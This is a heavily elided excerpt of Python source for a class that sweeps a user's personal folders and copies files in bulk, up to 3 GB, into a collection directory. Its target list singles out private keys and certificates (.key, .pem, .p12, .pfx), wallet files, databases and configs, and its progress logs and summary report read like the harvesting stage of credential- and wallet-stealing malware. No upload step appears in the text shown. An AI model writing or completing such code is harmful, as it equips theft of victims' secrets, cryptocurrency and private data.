...
class PersonalFiles:
    def __init__(self):
        self.max_total_size = 3 * 1024 * 1024 * 1024  # 3GB in bytes
        ...
        self.supported_extensions = {
            ...
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.py', '.java', '.cpp', '.c', '.html', '.css', '.js', '.php',
            '.sql', '.db', '.mdb', '.accdb',
            '.key', '.pem', '.p12', '.pfx', '.cer',
            '.wallet', '.dat', '.config', '.ini', '.cfg'
        }
    ...
    def should_include_file(self, filepath):
        ...
        try:
            ...
            # Check file size (skip files larger than 500MB individually)
    ...
    def grab_personal_files(self):
        """Main method to grab files from personal folders"""
        personal_folders = [
                ...
                for file in files:
                    ...
                    if self.should_include_file(file_path):
                        ...
                        if self.copy_file(file_path, personal_files_dir, dest_relative_path):
                            ...
                            if files_collected % 50 == 0:
                                print(f"Collected {files_collected} files ({total_size_mb:.2f} MB)...")
        ...
        with open(summary_path, 'w', encoding='utf-8') as f:
            ...
            f.write("================================\n\n")
            f.write(f"Total files collected: {files_collected}\n")
            f.write(f"Total size: {total_size_mb:.2f} MB\n")
            f.write(f"Size limit: 3.00 GB\n")
        ...
        print(f"Personal files collection completed: {files_collected} files ({total_size_mb:.2f} MB)")
